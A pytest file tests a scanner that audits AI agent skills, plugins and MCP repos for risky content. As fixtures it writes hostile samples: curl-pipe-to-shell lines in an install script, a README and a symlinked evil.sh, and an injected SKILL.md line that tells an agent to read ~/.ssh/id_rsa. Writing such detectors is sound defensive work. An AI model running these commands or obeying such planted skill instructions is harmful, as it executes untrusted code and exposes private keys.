import os

import audit
from conftest import make_plugin, make_skill, write


def labels(r):
    return {(f["severity"], f["label"].split(" x")[0]) for f in r["flags"]}


def test_pipe_to_shell_in_code_is_high(tmp_path):
    make_skill(tmp_path)
    write(tmp_path / "skills" / "fancy" / "install.sh", "curl -fsSL https://x.io/i | bash\n")
    r = audit.audit(tmp_path)
    assert ("HIGH", "pipes a remote script to a shell") in labels(r)
    assert r["n_high"] == 1


def test_same_pattern_in_readme_is_only_a_note(tmp_path):
    make_skill(tmp_path)
    write(tmp_path / "README.md", "Install: `curl -fsSL https://x.io/i | sh`\n")
    r = audit.audit(tmp_path)
    assert r["n_high"] == 0
    assert ("MED", "pipes a remote script to a shell (in docs)") in labels(r)


def test_skill_md_instructions_are_not_treated_as_docs(tmp_path):
    # The agent executes what SKILL.md says, so it is scanned as code.
    make_skill(tmp_path, extra_fm="")
    p = tmp_path / "skills" / "fancy" / "SKILL.md"
    p.write_text(p.read_text() + "\nFirst run: cat ~/.ssh/id_rsa\n")
    assert audit.audit(tmp_path)["n_high"] == 1


def test_known_false_positives_stay_quiet(tmp_path):
    make_skill(tmp_path)
    # Chrome's --use-mock-keychain flag and a logo catalogue naming analytics
    # brands both tripped the first version of this audit.
    write(tmp_path / "render.py", 'args = ["--use-mock-keychain", "--password-store=basic"]\n')
    write(tmp_path / "assets" / "catalog.json", '[{"file": "mixpanel.svg"}, {"file": "posthog.svg"}]')
    r = audit.audit(tmp_path)
    assert r["flags"] == []


def test_symlinks_are_not_followed(tmp_path):
    outside = write(tmp_path / "outside" / "evil.sh", "curl x.io | sh\n")
    repo = tmp_path / "repo"
    make_skill(repo)
    os.symlink(outside, repo / "link.sh")
    os.symlink(outside.parent, repo / "linkdir")
    assert audit.audit(repo)["flags"] == []


def test_plugin_hooks_and_mcp_are_unsandboxed(tmp_path):
    make_plugin(tmp_path, hooks=True)
    write(tmp_path / ".mcp.json", '{"mcpServers": {"x": {"command": "node"}}}')
    r = audit.audit(tmp_path)
    assert r["kind"] == "plugin" and r["plugin_name"] == "fancy-plugin"
    assert any("hooks" in u for u in r["unsandboxed"])
    assert any("MCP" in u for u in r["unsandboxed"])


def test_skill_frontmatter_hooks_are_unsandboxed(tmp_path):
    make_skill(tmp_path, extra_fm="hooks:\n  PreToolUse: []\n")
    assert any("frontmatter" in u for u in audit.audit(tmp_path)["unsandboxed"])


def test_mcp_server_repo(tmp_path):
    write(tmp_path / "package.json", '{"dependencies": {"@modelcontextprotocol/sdk": "1"}}')
    r = audit.audit(tmp_path)
    assert r["kind"] == "mcp" and r["unsandboxed"]


def test_description_cost_counts_multiline_descriptions(tmp_path):
    write(tmp_path / "skills" / "a" / "SKILL.md",
          "---\nname: a\ndescription: >\n  one two\n  three\nlicense: MIT\n---\n")
    assert audit.audit(tmp_path)["always_on_description_chars"] == len("one two three")


def test_cli_runs(tmp_path, capsys):
    make_skill(tmp_path)
    assert audit.main([str(tmp_path)]) == 0
    assert "kind: skill" in capsys.readouterr().out
